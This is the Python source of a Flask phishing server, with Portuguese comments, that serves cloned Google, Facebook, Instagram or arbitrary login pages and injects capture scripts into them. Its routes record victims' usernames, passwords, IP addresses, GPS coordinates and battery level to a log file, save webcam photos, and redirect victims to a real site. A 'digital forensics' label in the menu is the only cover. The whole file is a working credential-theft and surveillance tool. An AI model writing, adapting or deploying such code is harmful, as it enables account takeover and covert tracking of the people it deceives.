from flask import Flask, render_template_string, request, jsonify
import datetime, base64, os, requests

# --- CONFIGURAÇÃO DO CAMINHO STORAGE ---
if os.path.exists("/sdcard"):
    pasta_raiz = "/sdcard/info_spy"
else:
    pasta_raiz = os.path.join(os.getcwd(), "info_spy")

if not os.path.exists(pasta_raiz):
    try:
        os.makedirs(pasta_raiz)
    except Exception as e:
        print(f"Erro ao criar pasta: {e}")
        pasta_raiz = "info_spy"
        if not os.path.exists(pasta_raiz): os.makedirs(pasta_raiz)

# --- MENU DE SELEÇÃO ---
def mostrar_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("="*40)
    print(" PERÍCIA DIGITAL - SELECIONE O TEMA")
    print("="*40)
    print(" [1] Google Login")
    print(" [2] Facebook Login")
    print(" [3] Facebook Login PC")
    print(" [4] Instagram Login")
    print(" [5] Custom (URL)")
    print("="*40)

    opcao = input(" Escolha o template: ")
    
    url_custom = ""
    if opcao == "5":
        url_custom = input(" Digite a URL para clonar: ")
        if not url_custom.startswith("http"): url_custom = "https://" + url_custom

    link_destino = input(" Digite a URL para redirecionar: ")
    if not link_destino.startswith("http"):
        link_destino = "https://" + link_destino
    
    temas = {"1": "google", "2": "facebook", "3": "facebook_pc", "4": "instagram", "5": "custom"}
    return temas.get(opcao, "google"), link_destino, url_custom

pasta_tema, url_redirecionamento, url_alvo_custom = mostrar_menu()

app = Flask(__name__)

@app.route('/')
def index():
    if pasta_tema == "custom":
        try:
            res = requests.get(url_alvo_custom, verify=False, timeout=10)
            html_original = res.text
            caminho_html = os.path.join(pasta_raiz, "site_clonado.html")
            with open(caminho_html, "w", encoding="utf-8") as f:
                f.write(html_original)
        except Exception as e:
            return f"Erro ao clonar site: {e}", 500
    else:
        path = os.path.join("templates", pasta_tema, "index.html")
        if not os.path.exists(path):
            return f"Erro: Arquivo {path} nao encontrado!", 404
        with open(path, "r", encoding="utf-8") as f:
            html_original = f.read()
    
    script_config = (
        f'<script>'
        f'window.temaAtual = "{pasta_tema}"; '
        f'window.urlRedirecionamento = "{url_redirecionamento}";'
        f'</script>'
    )
    
    scripts_captura = (
        '\n<script src="/static/js/espiao.js"></script>'
        '\n<script src="/static/js/saida.js"></script>\n'
    )
    
    html_final = html_original.replace('<head>', '<head>' + script_config + scripts_captura)
    return render_template_string(html_final)

@app.route('/capturar', methods=['POST'])
def capturar():
    dados = request.json
    ip_list = request.headers.getlist("X-Forwarded-For")
    ip = ip_list[0] if ip_list else request.remote_addr
    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Adicionado campo BATERIA aqui no log
    log = (f"DATA: {agora} | IP: {ip}\n"
           f"TEMA: {pasta_tema.upper()} | BATERIA: {dados.get('bateria', 'N/A')}\n"
           f"EMAIL/USER: {dados.get('email')} | SENHA: {dados.get('pass')}\n"
           f"LAT: {dados.get('lat')} | LON: {dados.get('lon')}\n"
           f"{'-'*50}\n")
    
    caminho_relatorio = os.path.join(pasta_raiz, "relatorio.txt")
    with open(caminho_relatorio, "a") as f:
        f.write(log)
    print(f"[+] Evidência salva em: {caminho_relatorio}")
    return jsonify({"status": "ok"}), 200

@app.route('/foto', methods=['POST'])
def foto():
    try:
        dados = request.json
        img_str = dados['image'].split(",")[1]
        img_data = base64.b64decode(img_str)
        nome_foto = f"foto_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
        caminho_foto = os.path.join(pasta_raiz, nome_foto)
        with open(caminho_foto, "wb") as f:
            f.write(img_data)
        return "OK", 200
    except Exception as e:
        return "Erro", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
